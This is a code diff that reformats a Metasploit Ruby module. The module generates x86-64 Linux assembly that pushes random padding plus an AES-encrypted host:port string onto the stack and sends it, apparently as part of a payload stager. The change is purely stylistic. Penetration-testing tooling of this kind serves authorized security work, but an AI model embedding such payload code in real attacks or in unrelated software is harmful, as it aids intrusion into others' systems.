@@ -1,34 +1,32 @@
 # -*- coding: binary -*-
 
 module Msf
-   
-    module Payload::Linux::SendMagicX64
-        include Rex::Crypto
+  module Payload::Linux::SendMagicX64
+    include Rex::Crypto
 
-      def asm_send_magic(opts={})
-        
-        iconn = opts[:ihost]
-        iconn += ':'
-        iconn += opts[:iport]
-        n = rand(9...50)
-        r = Random.new.bytes(n - n % 8)
-    
-        magic = r
-        magic += Aes256.encrypt_aes256(opts[:iv], opts[:key], iconn)
+    def asm_send_magic(opts = {})
+      iconn = opts[:ihost]
+      iconn += ':'
+      iconn += opts[:iport]
+      n = rand(9...50)
+      r = Random.new.bytes(n - n % 8)
 
-        asm = %Q^
+      magic = r
+      magic += Aes256.encrypt_aes256(opts[:iv], opts[:key], iconn)
+
+      asm = %^
         send_magic:
           xor    rax, rax
           mov    al, 0x01
         ^
-        magic.reverse.bytes.each_slice(8) do |word|
-        asm <<%Q^
-          mov rbx, 0x#{word.pack("C*").unpack('H*')[0]}
+      magic.reverse.bytes.each_slice(8) do |word|
+        asm << %^
+          mov rbx, 0x#{word.pack('C*').unpack('H*')[0]}
           push   rbx
         ^
-        end
+      end
 
-        asm <<%Q^
+      asm << %^
           mov    dl, 0x#{'%02x' % magic.length}
           xor    rdi, rdi
           mov    rsi, rsp
@@ -36,11 +34,7 @@ module Msf
           xor    rdx, rdx
           xor    rsi, rsi
         ^
-        asm
-      end
-    
+      asm
     end
-    
-    end
-    
-    
+  end
+end
